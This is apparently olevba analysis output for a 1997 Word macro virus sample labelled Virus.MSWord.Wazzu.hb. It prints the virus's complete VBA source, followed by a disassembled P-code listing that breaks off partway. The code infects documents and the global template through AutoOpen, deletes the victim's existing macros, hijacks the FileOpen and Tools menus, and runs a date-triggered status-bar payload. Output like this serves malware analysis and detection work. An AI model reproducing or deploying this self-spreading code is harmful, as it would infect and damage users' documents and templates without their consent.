olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu.hb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu.hb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Wazzu.hb - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Einsteinium v.1.1.  (White Virus)
'Solidarity  M  Forever
'Medan 1997

Dim F$, ww, cn, ca, a, tj$, k, gd, FM1$, FM2$, FM3$, xo$, xc$, xt$, xm$, xf$, xe$, xn$, xg$

Public Sub MAIN()
Attribute MAIN.VB_Description = "3Ein.steinium1"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim wn$
F$ = ""
ww = 0
cn = 0
ca = 0
a = 0
tj$ = ""
k = 0
gd = 0
FM1$ = ""
FM2$ = ""
FM3$ = ""
xo$ = ""
xc$ = ""
xt$ = ""
xm$ = ""
xf$ = ""
xe$ = ""
xn$ = ""
xg$ = ""
WordBasic.DisableInput 1
F$ = WordBasic.[FileName$]()
If F$ = "" Or UCase(WordBasic.[Left$](F$, 8)) = "DOCUMENT" Then GoTo m1
Singkat
wn$ = WordBasic.[WindowName$]()
Dim fsa As Object: Set fsa = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs fsa
If fsa.Format = 0 Then
    fsa.Format = 1
    WordBasic.FileSaveAs fsa
    F$ = WordBasic.[FileName$]()
End If
CariTujuan (k)
WordBasic.Activate wn$
ca = WordBasic.CountMacros(1)
CheckFile
If ca = 0 Then GoTo m1
CheckGlobal
If ww <> 0 Then WordBasic.FileSaveAll 1
m1:
Tutup
Aksi
WordBasic.DisableInput 0
End Sub

Private Sub CariTujuan(k)
Dim i
Dim AN$
Dim su$
Dim CD$
i = 1
k = 0
While i <= WordBasic.CountAddIns()
    AN$ = WordBasic.[GetAddInName$](i)
    If UCase(WordBasic.[Right$](AN$, 10)) = "NARMOL.DOT" Then
        tj$ = AN$
        k = k + 1
        i = WordBasic.CountAddIns()
        WordBasic.AddInState AN$, 1
    End If
    i = i + 1
Wend
su$ = WordBasic.[DefaultDir$](8)
If k < 1 And su$ <> "" Then
    CD$ = WordBasic.[Files$](".")
    WordBasic.ChDir su$
    If WordBasic.[Files$](xn$) <> "" Then
        k = k + 1
        tj$ = su$ + "\" + xn$
    End If
    If CD$ <> "" Then WordBasic.ChDir CD$
End If
If k < 1 And su$ <> "" Then
    tj$ = su$ + "\" + xn$
    WordBasic.FileNew
    On Error GoTo -1: On Error GoTo ct1
    WordBasic.FileSaveAs Name:=tj$, Format:=1
    k = k + 1
ct1:
End If
If k < 1 And su$ = "" Then
    tj$ = "zxz"
    cn = WordBasic.CountMacros(0)
Else
    cn = WordBasic.CountMacros(0, 0, 1)
End If
End Sub

Private Sub CheckFile()
Dim o
Dim x
Dim h
Dim MA$
Dim MD$
Dim si$
Dim j
If ca = 0 Then TularFile
o = 0
ReDim sp__$(ca)
x = 0
For h = 1 To ca
    MA$ = WordBasic.[MacroName$](h, 1)
    MD$ = WordBasic.[MacroDesc$](MA$)
    If Tes(MD$) = 1 Then
        si$ = Mid(MD$, 2, 3)
        If si$ = "Ein" Then
            FM1$ = MA$
        ElseIf si$ = "han" Then
            FM2$ = MA$
        ElseIf si$ = "pen" Then
            FM3$ = MA$
        End If
        o = o + 1
    ElseIf UCase(MA$) = "AUTOOPEN" Or UCase(MA$) = "AUTOCLOSE" Then
        x = x + 1
        sp__$(x) = MA$
    End If
Next h
If x = 0 And o = 3 Then GoTo cf1
If x > 0 Then
    For j = 1 To x
        MD$ = WordBasic.[MacroDesc$](sp__$(j))
        If Tes(MD$) = 1 Then GoTo lain
        On Error GoTo -1: On Error GoTo lain
        WordBasic.Organizer Delete:=1, Source:=F$, Name:=sp__$(j), Tab:=3
lain:
    Next j
End If
If o <> 3 And ca <> 0 Then TularFile
cf1:
End Sub

Private Sub TularFile()
Dim y
Dim i
Dim FM$
Dim GM$
ReDim SM__$(3)
ReDim TM__$(3)
If a < 4 Then TM__$(1) = xo$ Else TM__$(1) = xc$
TM__$(2) = pl$(y)
tf1:
TM__$(3) = pl$(y)
If UCase(TM__$(2)) = UCase(TM__$(1)) Then GoTo tf1
SM__$(1) = xe$
SM__$(2) = xf$
SM__$(3) = xt$
For i = 1 To 3
    If tj$ <> "zxz" Then
        On Error GoTo -1: On Error GoTo tf2
        WordBasic.Organizer Copy:=1, Source:=tj$, Destination:=F$, Name:=SM__$(i), Tab:=3
        WordBasic.Organizer Rename:=1, Source:=F$, Name:=SM__$(i), NewName:=TM__$(i), Tab:=3
tf2:
    Else
        FM$ = F$ + ":" + TM__$(i)
        GM$ = xg$ + SM__$(i)
        On Error GoTo -1: On Error GoTo tf3
        WordBasic.MacroCopy GM$, FM$, 1
tf3:
    End If
Next i
WordBasic.FileSave
End Sub

Private Sub CheckGlobal()
Dim r
Dim x
Dim i
Dim MN$
Dim MD$
Dim cmn
Dim j
r = 0
x = 0
If cn = 0 Then
    TularGlobal
    GoTo cg1
End If
For i = 1 To cn
    If tj$ = "zxz" Then
        MN$ = WordBasic.[MacroName$](i, 0)
    Else
        MN$ = WordBasic.[MacroName$](i, 0, 0, 1)
    End If
    MD$ = WordBasic.[MacroDesc$](MN$)
    If Tes(MD$) = 1 Then
        If MN$ = xe$ Or MN$ = xf$ Or MN$ = xt$ Then r = r + 1
    End If
Next i
cg1:
x = 0
gd = 0
cmn = WordBasic.CountMacros(0)
ReDim sp__$(cmn)
For i = 1 To cmn
    MN$ = WordBasic.[MacroName$](i, 0)
    MD$ = WordBasic.[MacroDesc$](MN$)
    If Tes(MD$) = 1 Then
        If MN$ = xc$ Or MN$ = xm$ Then gd = gd + 1
    Else
        x = x + 1
        ww = x
        sp__$(x) = MN$
    End If
Next i
If x > 0 Then
    For j = 1 To x
        On Error GoTo -1: On Error GoTo cg2
        WordBasic.ToolsMacro Name:=sp__$(j), Show:=1, Delete:=1
cg2:
    Next j
End If
If r <> 3 And cn <> 0 Then TularGlobal
If gd < 2 Then Gandakan
Tutup
cg3:
End Sub

Private Sub TularGlobal()
Dim i
Dim FM$
Dim GM$
ww = ww + 1
ReDim SM__$(4)
ReDim TM__$(4)
SM__$(1) = FM1$
SM__$(2) = FM3$
SM__$(3) = FM2$
SM__$(4) = FM3$
TM__$(1) = xe$
TM__$(2) = xf$
TM__$(3) = xt$
TM__$(4) = "Show"
For i = 1 To 4
    If tj$ <> "zxz" Then
        On Error GoTo -1: On Error GoTo tg1
        If i <> 1 Then
            WordBasic.Organizer Rename:=1, Source:=F$, Name:=SM__$(i), NewName:=TM__$(i), Tab:=3
            WordBasic.Organizer Copy:=1, Source:=F$, Destination:=tj$, Name:=TM__$(i), Tab:=3
            WordBasic.Organizer Rename:=1, Source:=F$, Name:=TM__$(i), NewName:=SM__$(i), Tab:=3
        Else
            WordBasic.Organizer Copy:=1, Source:=F$, Destination:=tj$, Name:=SM__$(i), Tab:=3
            WordBasic.Organizer Rename:=1, Source:=tj$, Name:=SM__$(i), NewName:=TM__$(i), Tab:=3
        End If
tg1:
    Else
        FM$ = F$ + ":" + SM__$(i)
        GM$ = xg$ + TM__$(i)
        On Error GoTo -1: On Error GoTo tg2
        WordBasic.MacroCopy FM$, GM$, 1
tg2:
    End If
Next i
tg3:
WordBasic.SetTemplateDirty 0
End Sub

Private Sub Gandakan()
Dim FM$
Dim i
If FM2$ = "" Then GoTo g2
ReDim TM__$(2)
TM__$(1) = xg$ + xc$
TM__$(2) = xg$ + xm$
FM$ = F$ + ":" + FM2$
For i = 1 To 2
        On Error GoTo -1: On Error GoTo g1
        WordBasic.MacroCopy FM$, TM__$(i), 1
g1:
Next i
g2:
gd = 2
ww = gd
End Sub

Private Sub Aksi()
Dim th
Dim bl
Dim w
Dim z$
th = WordBasic.Year(WordBasic.Now())
If th < 1998 Then GoTo a2
bl = WordBasic.Month(WordBasic.Now())
If bl = 1 Or bl = 2 Then
    If th = 1998 Then GoTo a2
End If
w = WordBasic.Val(WordBasic.[GetProfileString$]("Emc2", "E"))
z$ = Str(w + 1)
If w < 53 Then GoTo a1
On Error GoTo -1: On Error GoTo a1
WordBasic.Call "Show_.Tampil"
z$ = "1"
a1:
WordBasic.SetProfileString "Emc2", "E", z$
a2:
End Sub

Private Sub Tutup()
Dim i
i = 1
While i <= WordBasic.CountWindows()
    If WordBasic.[WindowName$](i) = "NARMOL.DOT" Then
        WordBasic.Activate "NARMOL.DOT"
        WordBasic.DisableAutoMacros 1
        WordBasic.FileClose 1
        WordBasic.DisableAutoMacros 0
        i = CountWindow
        WordBasic.ToolsOptionsGeneral RecentFiles:=0
        WordBasic.ToolsOptionsGeneral RecentFiles:=1
        WordBasic.ToolsOptionsGeneral RecentFileCount:=5
    End If
    i = i + 1
Wend
End Sub

Private Function Tes(MD$)
Dim m
If Len(MD$) < 6 Then MD$ = "pemalas"
m = 0
If WordBasic.Val(WordBasic.[Right$](MD$, 1)) >= 1 And Mid(MD$, 5, 1) = "." Then m = 1
Tes = m
End Function

Private Sub Singkat()
a = WordBasic.Int(Rnd() * 10)
ca = 0
cn = 0
ww = 0
FM2$ = ""
tj$ = ""
xo$ = "AutoOpen"
xc$ = "AutoClose"
xt$ = "FileTemplates"
xm$ = "ToolsMacro"
xf$ = "FileOpen"
xe$ = "Einstein"
xn$ = "narmol.dot"
xg$ = "Global:"
End Sub

Private Function pl$(y)
Dim i
Dim s
Dim r
Dim x$
ReDim c__$(52)
For i = 1 To 26
    c__$(i + 26) = Chr(96 + i)
    c__$(i) = Chr(64 + i)
Next i
s = WordBasic.Int(Rnd() * 7) + 3
For i = 1 To s
    r = WordBasic.Int(Rnd() * 51) + 1
    x$ = x$ + c__$(r)
Next i
pl$ = x$
End Function
-------------------------------------------------------------------------------
VBA MACRO UjXlPG.bas 
in file: Virus.MSWord.Wazzu.hb - OLE stream: 'Macros/VBA/UjXlPG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "3han.ges the active template and the template option1"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.UjXlPG.MAIN"
Dim c
Dim i
Dim o
c = WordBasic.CountMacros(0, 1, 0)
For i = 1 To c
    If WordBasic.[MacroName$](i, 0, 1, 0) = "Einstein" Then
        o = 5
        i = c
    End If
Next i
On Error GoTo -1: On Error GoTo uh
If o = 5 Then WordBasic.Call "Einstein.Main"
uh:
End Sub
-------------------------------------------------------------------------------
VBA MACRO ijd.bas 
in file: Virus.MSWord.Wazzu.hb - OLE stream: 'Macros/VBA/ijd'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "3pen.s document or templat1"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ijd.MAIN"
    WordBasic.DisableAutoMacros 1
    Dim fop As Object: Set fop = WordBasic.DialogRecord.FileOpen(False)
    WordBasic.CurValues.FileOpen fop
    On Error GoTo -1: On Error GoTo owp
    WordBasic.Dialog.FileOpen fop
    On Error GoTo -1: On Error GoTo owp
    WordBasic.FileOpen fop
    Dim fsa As Object: Set fsa = WordBasic.DialogRecord.FileSaveAs(False)
    WordBasic.CurValues.FileSaveAs fsa
    On Error GoTo -1: On Error GoTo owp
    If fsa.Format = 1 Then WordBasic.Call "Einstein.Main"
owp:
    WordBasic.DisableAutoMacros 0
End Sub

Private Sub Tampil()
Dim u
Dim t
Dim l
Dim d
Dim v
Dim o
Dim s$
Dim e$
Dim i
Dim h
Dim j
Dim b$
Dim c$
c$ = Space(255)
u = 92328233527#
t = WordBasic.Second(WordBasic.Now())
If t > 57 Then
    l = 250
    GoTo hh
End If
While d <= 2
    d = WordBasic.Second(WordBasic.Now()) - t
    l = l + 0.4
Wend
hh:
v = 19232833341#
For o = 1 To 85
    s$ = s$ + " "
Next o
e$ = WordBasic.[LTrim$](Str(v)) + WordBasic.[LTrim$](Str(u))
For i = 2 To 43 Step 2
    If (i + 2) Mod 4 = 0 Then h = (WordBasic.Val(Mid(e$, i / 2, 2)) + 50) Else h = 90
    For j = 65 To h
        b$ = Chr(j)
        WordBasic.PrintStatusBar s$ + c$ + b$
            tn (l)
    Next j
    If (i + 2) Mod 4 <> 0 Then b$ = " "
c$ = c$ + b$
Next i
tn l * 10
WordBasic.Beep
End Sub

Private Sub tn(l)
Dim i
For i = 1 To WordBasic.Int(l)
Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Wazzu.hb
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 20118 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0021 "Einsteinium v.1.1.  (White Virus)"
' Line #2:
' 	QuoteRem 0x0000 0x0016 "Solidarity  M  Forever"
' Line #3:
' 	QuoteRem 0x0000 0x000A "Medan 1997"
' Line #4:
' Line #5:
' 	Dim 
' 	VarDefn False
' 	VarDefn ww
' 	VarDefn cn
' 	VarDefn ca
' 	VarDefn a
' 	VarDefn tj
' 	VarDefn k
' 	VarDefn gd
' 	VarDefn FM1
' 	VarDefn FM2
' 	VarDefn FM3
' 	VarDefn xo
' 	VarDefn xc
' 	VarDefn xt
' 	VarDefn xm
' 	VarDefn xf
' 	VarDefn xe
' 	VarDefn xn
' 	VarDefn xg
' Line #6:
' Line #7:
' 	FuncDefn (Public Sub MAIN())
' Line #8:
' 	Dim 
' 	VarDefn wn
' Line #9:
' 	LitStr 0x0000 ""
' 	St False$ 
' Line #10:
' 	LitDI2 0x0000 
' 	St ww 
' Line #11:
' 	LitDI2 0x0000 
' 	St cn 
' Line #12:
' 	LitDI2 0x0000 
' 	St ca 
' Line #13:
' 	LitDI2 0x0000 
' 	St a 
' Line #14:
' 	LitStr 0x0000 ""
' 	St tj$ 
' Line #15:
' 	LitDI2 0x0000 
' 	St k 
' Line #16:
' 	LitDI2 0x0000 
' 	St gd 
' Line #17:
' 	LitStr 0x0000 ""
' 	St FM1$ 
' Line #18:
' 	LitStr 0x0000 ""
' 	St FM2$ 
' Line #19:
' 	LitStr 0x0000 ""
' 	St FM3$ 
' Line #20:
' 	LitStr 0x0000 ""
' 	St xo$ 
' Line #21:
' 	LitStr 0x0000 ""
' 	St xc$ 
' Line #22:
' 	LitStr 0x0000 ""
' 	St xt$ 
' Line #23:
' 	LitStr 0x0000 ""
' 	St xm$ 
' Line #24:
' 	LitStr 0x0000 ""
' 	St xf$ 
' Line #25:
' 	LitStr 0x0000 ""
' 	St xe$ 
' Line #26:
' 	LitStr 0x0000 ""
' 	St xn$ 
' Line #27:
' 	LitStr 0x0000 ""
' 	St xg$ 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #29:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St False$ 
' Line #30:
' 	Ld False$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld False$ 
' 	LitDI2 0x0008 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0008 "DOCUMENT"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo m1 
' 	EndIf 
' Line #31:
' 	ArgsCall Singkat 0x0000 
' Line #32:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	St wn$ 
' Line #33:
' 	Dim 
' 	VarDefn fsa (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set fsa 
' Line #34:
' 	Ld fsa 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #35:
' 	Ld fsa 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld fsa 
' 	MemSt Format$ 
' Line #37:
' 	Ld fsa 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #38:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St False$ 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld k 
' 	Paren 
' 	ArgsCall CariTujuan 0x0001 
' Line #41:
' 	Ld wn$ 
' 	Ld WordBasic 
' 	ArgsMemCall Activate 0x0001 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St ca 
' Line #43:
' 	ArgsCall CheckFile 0x0000 
' Line #44:
' 	Ld ca 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo m1 
' 	EndIf 
' Line #45:
' 	ArgsCall CheckGlobal 0x0000 
' Line #46:
' 	Ld ww 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAll 0x0001 
' 	EndIf 
' Line #47:
' 	Label m1 
' Line #48:
' 	ArgsCall Tutup 0x0000 
' Line #49:
' 	ArgsCall Aksi 0x0000 
' Line #50:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #51:
' 	EndSub 
' Line #52:
' Line #53:
' 	FuncDefn (Private Sub CariTujuan(k))
' Line #54:
' 	Dim 
' 	VarDefn i
' Line #55:
' 	Dim 
' 	VarDefn AN
' Line #56:
' 	Dim 
' 	VarDefn su
' Line #57:
' 	Dim 
' 	VarDefn CD
' Line #58:
' 	LitDI2 0x0001 
' 	St i 
' Line #59:
' 	LitDI2 0x0000 
' 	St k 
' Line #60:
' 	Ld i 
' 	Ld WordBasic 
' 	ArgsMemLd CountAddIns 0x0000 
' 	Le 
' 	While 
' Line #61:
' 	Ld i 
' 	Ld WordBasic 
' 	ArgsMemLd [GetAddInName$] 0x0001 
' 	St AN$ 
' Line #62:
' 	Ld AN$ 
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000A "NARMOL.DOT"
' 	Eq 
' 	IfBlock 
' Line #63:
' 	Ld AN$ 
' 	St tj$ 
' Line #64:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #65:
' 	Ld WordBasic 
' 	ArgsMemLd CountAddIns 0x0000 
' 	St i 
' Line #66:
' 	Ld AN$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall AddInState 0x0002 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #69:
' 	Wend 
' Line #70:
' 	LitDI2 0x0008 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	St su$ 
' Line #71:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Lt 
' 	Ld su$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #72:
' 	LitStr 0x0001 "."
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	St CD$ 
' Line #73:
' 	Ld su$ 
' 	Ld WordBasic 
' 	ArgsMemCall ChDir 0x0001 
' Line #74:
' 	Ld xn$ 
' 	Ld WordBasic 
' 	ArgsMemLd [Files$] 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #75:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #76:
' 	Ld su$ 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld xn$ 
' 	Add 
' 	St tj$ 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	Ld CD$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld CD$ 
' 	Ld WordBasic 
' 	ArgsMemCall ChDir 0x0001 
' 	EndIf 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Lt 
' 	Ld su$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #81:
' 	Ld su$ 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld xn$ 
' 	Add 
' 	St tj$ 
' Line #82:
' 	Ld WordBasic 
' 	ArgsMemCall FileNew 0x0000 
' Line #83:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError ct1 
' Line #84:
' 	Ld tj$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #85:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #86:
' 	Label ct1 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Lt 
' 	Ld su$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	IfBlock 
' Line #89:
' 	LitStr 0x0003 "zxz"
' 	St tj$ 
' Line #90:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St cn 
' Line #91:
' 	ElseBlock 
' Line #92:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0003 
' 	St cn 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	EndSub 
' Line #95:
' Line #96:
' 	FuncDefn (Private Sub CheckFile())
' Line #97:
' 	Dim 
' 	VarDefn o
' Line #98:
' 	Dim 
' 	VarDefn x
' Line #99:
' 	Dim 
' 	VarDefn h
' Line #100:
' 	Dim 
' 	VarDefn MA
' Line #101:
' 	Dim 
' 	VarDefn MD
' Line #102:
' 	Dim 
' 	VarDefn si
' Line #103:
' 	Dim 
' 	VarDefn j
' Line #104:
' 	Ld ca 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall TularFile 0x0000 
' 	EndIf 
' Line #105:
' 	LitDI2 0x0000 
' 	St o 
' Line #106:
' 	OptionBase 
' 	Ld ca 
' 	Redim sp__$ 0x0001 (As String)
' Line #107:
' 	LitDI2 0x0000 
' 	St x 
' Line #108:
' 	StartForVariable 
' 	Ld h 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ca 
' 	For 
' Line #109:
' 	Ld h 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St MA$ 
' Line #110:
' 	Ld MA$ 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroDesc$] 0x0001 
' 	St MD$ 
' Line #111:
' 	Ld MD$ 
' 	ArgsLd Tes 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #112:
' 	Ld MD$ 
' 	LitDI2 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd Mid$ 0x0003 
' 	St si$ 
' Line #113:
' 	Ld si$ 
' 	LitStr 0x0003 "Ein"
' 	Eq 
' 	IfBlock 
' Line #114:
' 	Ld MA$ 
' 	St FM1$ 
' Line #115:
' 	Ld si$ 
' 	LitStr 0x0003 "han"
' 	Eq 
' 	ElseIfBlock 
' Line #116:
' 	Ld MA$ 
' 	St FM2$ 
' Line #117:
' 	Ld si$ 
' 	LitStr 0x0003 "pen"
' 	Eq 
' 	ElseIfBlock 
' Line #118:
' 	Ld MA$ 
' 	St FM3$ 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	Ld o 
' 	LitDI2 0x0001 
' 	Add 
' 	St o 
' Line #121:
' 	Ld MA$ 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0008 "AUTOOPEN"
' 	Eq 
' 	Ld MA$ 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0009 "AUTOCLOSE"
' 	Eq 
' 	Or 
' 	ElseIfBlock 
' Line #122:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #123:
' 	Ld MA$ 
' 	Ld x 
' 	ArgsSt sp__$ 0x0001 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	StartForVariable 
' 	Ld h 
' 	EndForVariable 
' 	NextVar 
' Line #126:
' 	Ld x 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld o 
' 	LitDI2 0x0003 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo cf1 
' 	EndIf 
' Line #127:
' 	Ld x 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #128:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	For 
' Line #129:
' 	Ld j 
' 	ArgsLd sp__$ 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroDesc$] 0x0001 
' 	St MD$ 
' Line #130:
' 	Ld MD$ 
' 	ArgsLd Tes 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo lain 
' 	EndIf 
' Line #131:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError lain 
' Line #132:
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld False$ 
' 	ParamNamed Source 
' 	Ld j 
' 	ArgsLd sp__$ 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0004 
' Line #133:
' 	Label lain 
' Line #134:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	Ld o 
' 	LitDI2 0x0003 
' 	Ne 
' 	Ld ca 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall TularFile 0x0000 
' 	EndIf 
' Line #137:
' 	Label cf1 
' Line #138:
' 	EndSub 
' Line #139:
' Line #140:
' 	FuncDefn (Private Sub TularFile())
' Line #141:
' 	Dim 
' 	VarDefn y
' Line #142:
' 	Dim 
' 	VarDefn i
' Line #143:
' 	Dim 
' 	VarDefn FM
' Line #144:
' 	Dim 
' 	VarDefn GM
' Line #145:
' 	OptionBase 
' 	LitDI2 0x0003 
' 	Redim SM__$ 0x0001 (As String)
' Line #146:
' 	OptionBase 
' 	LitDI2 0x0003 
' 	Redim TM__$ 0x0001 (As String)
' Line #147:
' 	Ld a 
' 	LitDI2 0x0004 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld xo$ 
' 	LitDI2 0x0001 
' 	ArgsSt TM__$ 0x0001 
' 	Else 
' 	BoSImplicit 
' 	Ld xc$ 
' 	LitDI2 0x0001 
' 	ArgsSt TM__$ 0x0001 
' 	EndIf 
' Line #148:
' 	Ld y 
' 	ArgsLd pl$ 0x0001 
' 	LitDI2 0x0002 
' 	ArgsSt TM__$ 0x0001 
' Line #149:
' 	Label tf1 
' Line #150:
' 	Ld y 
' 	ArgsLd pl$ 0x0001 
' 	LitDI2 0x0003 
' 	ArgsSt TM__$ 0x0001 
' Line #151:
' 	LitDI2 0x0002 
' 	ArgsLd TM__$ 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd TM__$ 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo tf1 
' 	EndIf 
' Line #152:
' 	Ld xe$ 
' 	LitDI2 0x0001 
' 	ArgsSt SM__$ 0x0001 
' Line #153:
' 	Ld xf$ 
' 	LitDI2 0x0002 
' 	ArgsSt SM__$ 0x0001 
' Line #154:
' 	Ld xt$ 
' 	LitDI2 0x0003 
' 	ArgsSt SM__$ 0x0001 
' Line #155:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #156:
' 	Ld tj$ 
' 	LitStr 0x0003 "zxz"
' 	Ne 
' 	IfBlock 
' Line #157:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError tf2 
' Line #158:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld tj$ 
' 	ParamNamed Source 
' 	Ld False$ 
' 	ParamNamed Destination 
' 	Ld i 
' 	ArgsLd SM__$ 0x0001 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #159:
' 	LitDI2 0x0001 
' 	ParamNamed Rename 
' 	Ld False$ 
' 	ParamNamed Source 
' 	Ld i 
' 	ArgsLd SM__$ 0x0001 
' 	ParamNamed New 
' 	Ld i 
' 	ArgsLd TM__$ 0x0001 
' 	ParamNamed NewName 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
